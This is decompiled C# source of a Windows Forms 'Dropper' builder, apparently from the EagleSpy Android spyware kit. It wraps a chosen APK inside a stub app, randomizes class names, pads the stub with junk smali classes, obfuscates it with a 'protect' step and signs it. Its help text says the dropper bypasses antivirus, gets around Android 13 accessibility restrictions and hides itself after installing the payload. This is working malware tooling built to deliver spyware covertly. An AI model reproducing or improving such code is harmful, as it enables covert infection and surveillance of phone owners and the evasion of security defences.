using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200006D RID: 109
[DesignerGenerated]
public partial class Drooper : Form
{
	// Token: 0x06000518 RID: 1304 RVA: 0x0007F2D8 File Offset: 0x0007D4D8
	public Drooper()
	{
		base.FormClosing += this.Drooper_FormClosing;
		base.Load += this.Drooper_Load;
		this.TargetAPKPATH = "";
		this.TargetApkicon = "";
		this.originalapkname = "";
		this.APKINFO = "";
		this.outputpath = "";
		this.buildapkpath = "";
		this.assetspath = "";
		this.ClassesPath = "";
		this.stringspath = "";
		this.stubicon = "";
		this.BASEPATH = "";
		this.STUBPATH = "";
		this.apktoolpath = "";
		this.Apksignerpath = "";
		this.ApkZIPpath = "";
		this.Apkeditorpath = "";
		this.C = "";
		this.K = "";
		this.MainfistPath = "";
		this.ClassGen1 = "BroReceiver";
		this.ClassGen2 = "ConfirmDialog";
		this.ClassGen3 = "MainActivity";
		this.ClassGen4 = "SecoundActivity";
		this.ClassGen5 = "SessionManager";
		this.N_Class1 = "";
		this.N_Class2 = "";
		this.N_Class3 = "";
		this.N_Class4 = "";
		this.N_Class5 = "";
		this.firsttry = false;
		this.HoldExtract = false;
		this.Waitbuild = true;
		this.Waitprotect = true;
		this.cou = 0;
		this.FoundJava = false;
		this.InitializeComponent();
	}

	// Token: 0x0600051B RID: 1307 RVA: 0x00080434 File Offset: 0x0007E634
	private void Selectapkbtn_Click(object sender, EventArgs e)
	{
		if (this.BackgroundWorker1.IsBusy)
		{
			EagleAlert.Showinformation("Please Wait...");
		}
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
		openFileDialog.Filter = "apk Files|*.apk";
		openFileDialog.RestoreDirectory = true;
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			this.TapkText.Text = "";
		}
		else
		{
			this.TapkText.Text = openFileDialog.FileName;
			this.TargetAPKPATH = openFileDialog.FileName;
			if (!this.BackgroundWorker1.IsBusy)
			{
				this.BackgroundWorker1.RunWorkerAsync();
			}
			this.originalapkname = Path.GetFileName(openFileDialog.FileName);
		}
	}

	// Token: 0x0600051C RID: 1308 RVA: 0x000804E8 File Offset: 0x0007E6E8
	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		if (!string.IsNullOrEmpty(this.TargetAPKPATH))
		{
			Drooper._Closure_0024__77_002D0 arg = null;
			Drooper._Closure_0024__77_002D0 CS_0024_003C_003E8__locals0 = new Drooper._Closure_0024__77_002D0(arg);
			CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
			this.APKINFO = Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\aapt.exe"), "dump badging \"" + this.TargetAPKPATH + "\"", 5000);
			if (this.apkicon.Image != null)
			{
				this.apkicon.Image.Dispose();
				this.apkicon.Image = null;
			}
			CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = Codes.ExtractName(this.TargetAPKPATH);
			CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName = Conversions.ToString(Codes.RegexMatcher("(?<=package: name=\\')(.*?)(?=\\')", this.APKINFO));
			Conversions.ToString(Codes.RegexMatcher("(?<=versionCode=\\')(.*?)(?=\\')", this.APKINFO));
			Conversions.ToString(Codes.RegexMatcher("(?<=versionName=\\')(.*?)(?=\\')", this.APKINFO));
			string sdkNumber = Conversions.ToString(Codes.RegexMatcher("(?<=sdkVersion:\\')(.*?)(?=\\')", this.APKINFO));
			Codes.GetAndroidVersionName(sdkNumber);
			string sdkNumber2 = Conversions.ToString(Codes.RegexMatcher("(?<=targetSdkVersion:\\')(.*?)(?=\\')", this.APKINFO));
			Codes.GetAndroidVersionName(sdkNumber2);
			if (string.IsNullOrEmpty(CS_0024_003C_003E8__locals0._0024VB_0024Local_appname))
			{
				MatchCollection matchCollection = Regex.Matches(this.APKINFO, "application-label:'([^']*)'");
				if (matchCollection.Count > 0)
				{
					using (IEnumerator enumerator = matchCollection.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							object obj = enumerator.Current;
							Match match = (Match)obj;
							string value = match.Groups[1].Value;
							Console.WriteLine("Found application label: " + value);
							CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = value;
						}
						goto IL_1D6;
					}
				}
				CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = "Not found";
			}
			IL_1D6:
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelname.Text = "App Name:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelid.Text = "App ID:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
					}));
				}
				else
				{
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelname.Text = "姓名:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelid.Text = "标识符:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
					}));
				}
			}
			else
			{
				base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
				{
					CS_0024_003C_003E8__locals0._0024VB_0024Me.labelname.Text = "الأسم:";
					CS_0024_003C_003E8__locals0._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
					CS_0024_003C_003E8__locals0._0024VB_0024Me.labelid.Text = "المعرف:";
					CS_0024_003C_003E8__locals0._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
				}));
			}
			string text = Conversions.ToString(Codes.RegexMatcher("(?<=application-icon-160:\\')(.*?)(?=\\')", this.APKINFO));
			if (Operators.CompareString(Path.GetExtension(text), ".xml", false) == 0)
			{
				text = text.Replace(".xml", ".png");
			}
			string text2 = Codes.TempPathCache + CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName + "\\\\" + text;
			string directoryName = Path.GetDirectoryName(text2);
			if (text.Contains("anydpi-v26"))
			{
				string[] pngs = Codes.pngs;
				foreach (string newValue in pngs)
				{
					string text3 = text.Replace("mipmap-anydpi-v26", newValue).Replace("drawable-anydpi-v26", newValue);
					Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
					{
						"e \"",
						this.TargetAPKPATH,
						"\" \"",
						text3,
						"\" -o\"",
						directoryName,
						"\" -aoa"
					}), 5000);
				}
			}
			else
			{
				Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
				{
					"e \"",
					this.TargetAPKPATH,
					"\" \"",
					text,
					"\" -o\"",
					directoryName,
					"\" -aoa"
				}), 5000);
			}
			Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
			{
				"e \"",
				this.TargetAPKPATH,
				"\" \"META-INF\" -o\"",
				Codes.TempPathCache,
				CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName,
				"\\META-INF\" -aoa"
			}), 5000);
			try
			{
				this.apkicon.Image = Image.FromFile(text2);
				this.TargetApkicon = text2;
			}
			catch (Exception)
			{
				this.apkicon.Image = Resources.noicon;
				this.TargetApkicon = null;
			}
		}
	}

	// Token: 0x0600051D RID: 1309 RVA: 0x00080944 File Offset: 0x0007EB44
	private void Button1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Selecte image icon [Only .PNG] (.png)";
		openFileDialog.Filter = "png Files|*.png";
		openFileDialog.RestoreDirectory = true;
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			this.TargetApkicon = null;
		}
		else
		{
			Bitmap image = new Bitmap(Image.FromFile(openFileDialog.FileName));
			this.apkicon.Image = image;
			this.TargetApkicon = openFileDialog.FileName;
		}
	}

	// Token: 0x0600051E RID: 1310 RVA: 0x000809B8 File Offset: 0x0007EBB8
	public void LogBack(object[] objs)
	{
		if (base.InvokeRequired)
		{
			Drooper.addLogback method = new Drooper.addLogback(this.LogBack);
			base.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			string str = Conversions.ToString(objs[0]);
			this.logtext.AppendText("> " + str + "\r\n");
			this.logtext.SelectionStart = Strings.Len(this.logtext.Text);
			this.logtext.ScrollToCaret();
			this.logtext.Select();
		}
	}

	// Token: 0x0600051F RID: 1311 RVA: 0x00002C8C File Offset: 0x00000E8C
	public void log(string Str)
	{
		this.LogBack(new object[]
		{
			Str
		});
	}

	// Token: 0x06000520 RID: 1312 RVA: 0x00080A44 File Offset: 0x0007EC44
	private void Button2_Click(object sender, EventArgs e)
	{
		if (this.WorkWorker != null && this.WorkWorker.IsBusy)
		{
			EagleAlert.Showinformation("Dropper is working...");
		}
		else if (string.IsNullOrEmpty(this.TargetAPKPATH))
		{
			EagleAlert.Showinformation("Please select app first");
		}
		else if (string.IsNullOrEmpty(this.TargetApkicon))
		{
			EagleAlert.Showinformation("no icon is selected !!!");
		}
		else if (string.IsNullOrEmpty(this.textpkgname.Text) | string.IsNullOrEmpty(this.textappname.Text))
		{
			EagleAlert.Showinformation("App name and package is required");
		}
		else
		{
			this.WorkWorker.RunWorkerAsync();
			this.cmdProcess = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			this.cmdProcess.EnableRaisingEvents = true;
			this.cmdProcess.StartInfo = processStartInfo;
			this.cmdProcess.OutputDataReceived += this.cmdOutputHandler;
			this.cmdProcess.ErrorDataReceived += this.cmdOutputHandler;
			this.cmdProcess.Start();
			this.cmdProcess.BeginOutputReadLine();
			this.cmdProcess.BeginErrorReadLine();
			this.log("Check for java");
			this.ExecuteCommand("java -version");
		}
	}

	// Token: 0x06000521 RID: 1313 RVA: 0x00002C9E File Offset: 0x00000E9E
	private void S()
	{
		Thread.Sleep(1000);
	}

	// Token: 0x06000522 RID: 1314 RVA: 0x00080BB4 File Offset: 0x0007EDB4
	private void WorkWorker_DoWork(object sender, DoWorkEventArgs e)
	{
		checked
		{
			try
			{
				this.log("Starting...");
				while (this.HoldExtract)
				{
					this.S();
				}
				this.log("Extracting...");
				string driv = Codes.GetDriv();
				this.WorkDIR = driv + "EagleSpy_Dropper";
				this.STUBPATH = this.WorkDIR + "\\STUB";
				this.outputpath = this.WorkDIR + "\\out";
				this.buildapkpath = this.outputpath + "\\temp.apk";
				while (Directory.Exists(this.WorkDIR))
				{
					if (this.firsttry)
					{
						this.WorkDIR = Codes.GenerateRandomFolderName("drop");
						IL_103:
						this.apktoolpath = this.WorkDIR + "\\tools\\apktool.jar";
						this.Apksignerpath = this.WorkDIR + "\\tools\\signapk.jar";
						this.ApkZIPpath = this.WorkDIR + "\\tools\\zipalign.exe";
						this.Apkeditorpath = this.WorkDIR + "\\tools\\ApkEditor.jar";
						this.C = this.WorkDIR + "\\tools\\certificate.pem";
						this.K = this.WorkDIR + "\\tools\\key.pk8";
						File.WriteAllBytes(this.apktoolpath, Resources.apktool);
						File.WriteAllBytes(this.Apksignerpath, Resources.signapk);
						File.WriteAllBytes(this.ApkZIPpath, Resources.zipalign);
						File.WriteAllBytes(this.Apkeditorpath, Resources.APKEditor);
						File.WriteAllBytes(this.STUBPATH + "\\drop.zip", Resources.dropstub);
						ZipFile.ExtractToDirectory(this.STUBPATH + "\\drop.zip", this.STUBPATH);
						this.S();
						File.Delete(this.STUBPATH + "\\drop.zip");
						this.log("loading payload...");
						this.assetspath = this.STUBPATH + "\\assets";
						this.BASEPATH = this.assetspath + "\\childapp.apk";
						if (File.Exists(this.BASEPATH))
						{
							File.Delete(this.BASEPATH);
						}
						File.Copy(this.TargetAPKPATH, this.BASEPATH);
						this.stringspath = this.STUBPATH + "\\res\\values\\strings.xml";
						this.MainfistPath = this.STUBPATH + "\\AndroidManifest.xml";
						this.stubicon = this.STUBPATH + "\\res\\drawable\\myicon.png";
						this.log("loading data...");
						string contents = File.ReadAllText(this.stringspath).Replace("[MY-NAME]", this.textappname.Text);
						File.WriteAllText(this.stringspath, contents);
						File.Delete(this.stubicon);
						File.Copy(this.TargetApkicon, this.stubicon);
						this.log("Encoding");
						this.ClassesPath = this.STUBPATH + "\\smali\\com\\appd\\instll";
						string newValue = "com";
						string str = "appd";
						string str2 = "instll";
						string[] files = Directory.GetFiles(this.STUBPATH + "\\smali\\com\\appd\\instll");
						if (!File.Exists(reso.Junkpath))
						{
							File.WriteAllBytes(reso.Junkpath, Resources.junk);
						}
						string text = File.ReadAllText(reso.Junkpath);
						this.N_Class1 = this.RandommMadv2(30);
						this.N_Class2 = this.RandommMadv2(30);
						this.N_Class3 = this.RandommMadv2(30);
						this.N_Class4 = this.RandommMadv2(30);
						this.N_Class5 = this.RandommMadv2(30);
						string contents2 = File.ReadAllText(this.MainfistPath).Replace(this.ClassGen1, this.N_Class1).Replace(this.ClassGen2, this.N_Class2).Replace(this.ClassGen3, this.N_Class3).Replace(this.ClassGen4, this.N_Class4).Replace(this.ClassGen5, this.N_Class5);
						File.WriteAllText(this.MainfistPath, contents2);
						string[] array = files;
						foreach (string path in array)
						{
							string contents3 = File.ReadAllText(path).Replace("[T_ID]", this.textpkgname.Text).Replace(this.ClassGen1, this.N_Class1).Replace(this.ClassGen2, this.N_Class2).Replace(this.ClassGen3, this.N_Class3).Replace(this.ClassGen4, this.N_Class4).Replace(this.ClassGen5, this.N_Class5);
							File.WriteAllText(path, contents3);
						}
						int num = 1;
						do
						{
							string text2 = this.RandommMadv2(30);
							File.WriteAllText(this.ClassesPath + "\\" + text2 + ".smali", text.Replace("spymax", newValue).Replace("stub7", str + "/" + str2).Replace("[MYNAME]", text2));
							num++;
						}
						while (num <= 50);
						this.S();
						this.S();
						this.S();
						this.log("Building Dropper...");
						this.ExecuteCommand(string.Concat(new string[]
						{
							"java -jar ",
							this.apktoolpath,
							" b -f ",
							this.STUBPATH,
							" -o ",
							this.buildapkpath
						}));
						do
						{
							this.S();
						}
						while (this.Waitbuild);
						this.log("Zip Align..");
						string command = string.Concat(new string[]
						{
							this.ApkZIPpath,
							" 4 \"",
							this.buildapkpath,
							"\" \"",
							this.buildapkpath.Replace("temp.apk", "temp_zip.apk"),
							"\""
						});
						string text3 = this.buildapkpath.Replace("temp.apk", "temp_zip.apk");
						this.ExecuteCommand(command);
						do
						{
							this.S();
						}
						while (!File.Exists(text3) | Codes.FileInUse(text3));
						File.Delete(this.buildapkpath);
						this.log("Protect Dropper..");
						string text4 = text3.Replace(".apk", "_protected.apk");
						string command2 = string.Concat(new string[]
						{
							"java -jar ",
							this.Apkeditorpath,
							" p  -i \"",
							text3,
							"\""
						});
						this.ExecuteCommand(command2);
						do
						{
							this.S();
						}
						while (this.Waitprotect | Codes.FileInUse(text4));
						File.Delete(text3);
						this.log("Signing Dropper..");
						File.WriteAllBytes(this.C, Resources.C2);
						File.WriteAllBytes(this.K, Resources.K2);
						this.S();
						string text5 = this.outputpath + "\\" + this.originalapkname.Replace(".apk", "_Dropper.apk");
						string command3 = string.Concat(new string[]
						{
							"java -jar \"",
							this.Apksignerpath,
							"\" sign --key \"",
							this.K,
							"\" --cert \"",
							this.C,
							"\"  --v2-signing-enabled true --v3-signing-enabled true --out \"",
							text5,
							"\" \"",
							text4,
							"\""
						});
						this.ExecuteCommand(command3);
						do
						{
							this.S();
						}
						while (!File.Exists(text5) | Codes.FileInUse(text5) | Codes.FileInUse(text4));
						File.Delete(text4);
						this.log("finishing...");
						this.S();
						this.log("5");
						this.S();
						this.log("4");
						this.S();
						this.log("3");
						this.S();
						this.log("2");
						this.S();
						this.log("1");
						this.S();
						Process.Start(this.outputpath);
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							base.Close();
							this.StopCommandPrompt();
						}));
						return;
					}
					this.firsttry = true;
					Codes.DirectoryDeleteLong(this.WorkDIR);
					Thread.Sleep(3000);
				}
				Directory.CreateDirectory(this.WorkDIR);
				Directory.CreateDirectory(this.WorkDIR + "\\tools");
				Directory.CreateDirectory(this.STUBPATH);
				Directory.CreateDirectory(this.outputpath);
				goto IL_103;
			}
			catch (Exception ex)
			{
				Exception ex2 = ex;
				if (Codes.MyMsgBox("Drooper Error", ex2.Message, false, Resources.error48px))
				{
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
					{
						base.Close();
					}));
				}
			}
		}
	}

	// Token: 0x06000523 RID: 1315 RVA: 0x00081458 File Offset: 0x0007F658
	private void StopCommandPrompt()
	{
		try
		{
			if (this.cmdProcess != null)
			{
				this.ExecuteCommand("EXIT");
				this.S();
				this.cmdProcess.CloseMainWindow();
				this.cmdProcess.Close();
				this.cmdProcess.Dispose();
				this.cmdProcess = null;
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000524 RID: 1316 RVA: 0x000814C0 File Offset: 0x0007F6C0
	public string RandommMadv2(int minCharacters)
	{
		string text = "QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp";
		if (this.rshit == null)
		{
			this.rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[this.rshit.Next(0, text.Length - 1)]);
			}
			this.cou++;
			return text2.ToString().ToLower() + Conversions.ToString(this.cou);
		}
	}

	// Token: 0x06000525 RID: 1317 RVA: 0x00002CAA File Offset: 0x00000EAA
	private void ExecuteCommand(string command)
	{
		this.cmdProcess.StandardInput.WriteLine(command);
		this.cmdProcess.StandardInput.Flush();
	}

	// Token: 0x06000526 RID: 1318 RVA: 0x00081550 File Offset: 0x0007F750
	private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
	{
		if (!string.IsNullOrEmpty(e.Data))
		{
			string data = e.Data;
			if (data.Contains("java"))
			{
				this.log(data);
			}
			if (data.Contains("[PROTECT] Saved to"))
			{
				this.Waitprotect = false;
			}
			if (data.StartsWith("I:"))
			{
				this.log(data.Replace("I:", ""));
			}
			if (data.Contains("[PROTECT]") && !data.Contains("Writing:"))
			{
				this.log(data);
			}
			else if (data.Contains("Built apk"))
			{
				this.Waitbuild = false;
			}
			else if (data.StartsWith("E:"))
			{
				this.log(data.Replace("E:", "Error:"));
			}
			if ((data.Contains("Java(TM)") | data.Contains("OpenJDK")) && !this.FoundJava)
			{
				this.FoundJava = true;
				this.HoldExtract = false;
			}
		}
	}

	// Token: 0x06000527 RID: 1319 RVA: 0x0000206C File Offset: 0x0000026C
	private void Drooper_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	// Token: 0x06000528 RID: 1320 RVA: 0x0008165C File Offset: 0x0007F85C
	private void Button3_Click(object sender, EventArgs e)
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				Codes.MyMsgBox("info", "dropper is like loader , it hold your apk inside of it ,and when user opens it, it will ask user to install your app , why? :\r\n1: Clean loader hold the apk to bypass antivirus\r\n2: Help to Bypass android 13 Accessibility restriction\r\n3: Hide itself after dropping the payload \r\n", false, Resources.information48px);
			}
			else
			{
				Codes.MyMsgBox("info", "المثبت مثل أداة التحميل ، فهو يحمل ملف apk بداخله ، وعندما يفتحه المستخدم ، سيطلب من المستخدم تثبيت تطبيقك ، لماذا؟ :\r\n1: محمل نظيف يحمل apk لتجاوز مكافحة الفيروسات\r\n2: المساعدة في تجاوز قيود إمكانية الوصول لنظام Android 13\r\n3: إخفاء نفسه بعد تثبيت apk", false, Resources.information48px);
			}
		}
		else
		{
			Codes.MyMsgBox("info", "安装程序就像加载程序，它将您的apk保存在其中，当用户打开它时，它会要求用户安装您的应用程序，为什么？ :\r\n1: Clean loader 保留 apk 以绕过防病毒软件\r\n2：帮助绕过android 13辅助功能限制\r\n3：安装apk后隐藏自身", false, Resources.information48px);
		}
	}

	// Token: 0x06000529 RID: 1321 RVA: 0x000816D8 File Offset: 0x0007F8D8
	private void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.selectapkbtn.Text = "选择一个文件";
				this.labelname.Text = "应用名称";
				this.Button1.Text = "选择图像";
				this.Button2.Text = "建造";
			}
		}
		else
		{
			this.selectapkbtn.Text = "إختيار تطبيق";
			this.labelname.Text = "اسم التطبيق";
			this.Button1.Text = "اختيار صورة";
			this.Button2.Text = "بناء";
		}
	}

	// Token: 0x0600052A RID: 1322 RVA: 0x00002CCD File Offset: 0x00000ECD
	private void Drooper_Load(object sender, EventArgs e)
	{
		this.Translateme();
	}

	// Token: 0x0600052B RID: 1323 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUISymbolLabel1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x040006DC RID: 1756
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	// Token: 0x040006DD RID: 1757
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selectapkbtn")]
	private Button _selectapkbtn;

	// Token: 0x040006DE RID: 1758
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	// Token: 0x040006DF RID: 1759
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	// Token: 0x040006E0 RID: 1760
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WorkWorker")]
	private BackgroundWorker _WorkWorker;

	// Token: 0x040006E1 RID: 1761
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	// Token: 0x040006E2 RID: 1762
	private string TargetAPKPATH;

	// Token: 0x040006E3 RID: 1763
	private string TargetApkicon;

	// Token: 0x040006E4 RID: 1764
	private string originalapkname;

	// Token: 0x040006E5 RID: 1765
	private string APKINFO;

	// Token: 0x040006E6 RID: 1766
	private Process cmdProcess;

	// Token: 0x040006E7 RID: 1767
	private string WorkDIR;

	// Token: 0x040006E8 RID: 1768
	private string outputpath;

	// Token: 0x040006E9 RID: 1769
	private string buildapkpath;

	// Token: 0x040006EA RID: 1770
	private string assetspath;

	// Token: 0x040006EB RID: 1771
	private string ClassesPath;

	// Token: 0x040006EC RID: 1772
	private string stringspath;

	// Token: 0x040006ED RID: 1773
	private string stubicon;

	// Token: 0x040006EE RID: 1774
	private string BASEPATH;

	// Token: 0x040006EF RID: 1775
	private string STUBPATH;

	// Token: 0x040006F0 RID: 1776
	private string apktoolpath;

	// Token: 0x040006F1 RID: 1777
	private string Apksignerpath;

	// Token: 0x040006F2 RID: 1778
	private string ApkZIPpath;

	// Token: 0x040006F3 RID: 1779
	private string Apkeditorpath;

	// Token: 0x040006F4 RID: 1780
	private string C;

	// Token: 0x040006F5 RID: 1781
	private string K;

	// Token: 0x040006F6 RID: 1782
	private string MainfistPath;

	// Token: 0x040006F7 RID: 1783
	private string ClassGen1;

	// Token: 0x040006F8 RID: 1784
	private string ClassGen2;

	// Token: 0x040006F9 RID: 1785
	private string ClassGen3;

	// Token: 0x040006FA RID: 1786
	private string ClassGen4;

	// Token: 0x040006FB RID: 1787
	private string ClassGen5;

	// Token: 0x040006FC RID: 1788
	private string N_Class1;

	// Token: 0x040006FD RID: 1789
	private string N_Class2;

	// Token: 0x040006FE RID: 1790
	private string N_Class3;

	// Token: 0x040006FF RID: 1791
	private string N_Class4;

	// Token: 0x04000700 RID: 1792
	private string N_Class5;

	// Token: 0x04000701 RID: 1793
	private bool firsttry;

	// Token: 0x04000702 RID: 1794
	private bool HoldExtract;

	// Token: 0x04000703 RID: 1795
	private bool Waitbuild;

	// Token: 0x04000704 RID: 1796
	private bool Waitprotect;

	// Token: 0x04000705 RID: 1797
	private Random rshit;

	// Token: 0x04000706 RID: 1798
	private int cou;

	// Token: 0x04000707 RID: 1799
	private bool FoundJava;

	// Token: 0x0200006E RID: 110
	// (Invoke) Token: 0x0600052F RID: 1327
	public delegate void addLogback(object[] objs);

	// Token: 0x0200006F RID: 111
	[CompilerGenerated]
	internal sealed class _Closure_0024__77_002D0
	{
		// Token: 0x06000532 RID: 1330 RVA: 0x00081794 File Offset: 0x0007F994
		public _Closure_0024__77_002D0(Drooper._Closure_0024__77_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
				this._0024VB_0024Local_PackageName = arg0._0024VB_0024Local_PackageName;
			}
		}

		// Token: 0x06000533 RID: 1331 RVA: 0x000817C8 File Offset: 0x0007F9C8
		internal void _Lambda_0024__0()
		{
			this._0024VB_0024Me.labelname.Text = "الأسم:";
			this._0024VB_0024Me.textappname.Text = this._0024VB_0024Local_appname;
			this._0024VB_0024Me.labelid.Text = "المعرف:";
			this._0024VB_0024Me.textpkgname.Text = this._0024VB_0024Local_PackageName;
		}

		// Token: 0x06000534 RID: 1332 RVA: 0x0008182C File Offset: 0x0007FA2C
		internal void _Lambda_0024__1()
		{
			this._0024VB_0024Me.labelname.Text = "姓名:";
			this._0024VB_0024Me.textappname.Text = this._0024VB_0024Local_appname;
			this._0024VB_0024Me.labelid.Text = "标识符:";
			this._0024VB_0024Me.textpkgname.Text = this._0024VB_0024Local_PackageName;
		}

		// Token: 0x06000535 RID: 1333 RVA: 0x00081890 File Offset: 0x0007FA90
		internal void _Lambda_0024__2()
		{
			this._0024VB_0024Me.labelname.Text = "App Name:";
			this._0024VB_0024Me.textappname.Text = this._0024VB_0024Local_appname;
			this._0024VB_0024Me.labelid.Text = "App ID:";
			this._0024VB_0024Me.textpkgname.Text = this._0024VB_0024Local_PackageName;
		}

		// Token: 0x04000718 RID: 1816
		public string _0024VB_0024Local_appname;

		// Token: 0x04000719 RID: 1817
		public string _0024VB_0024Local_PackageName;

		// Token: 0x0400071A RID: 1818
		public Drooper _0024VB_0024Me;
	}
}
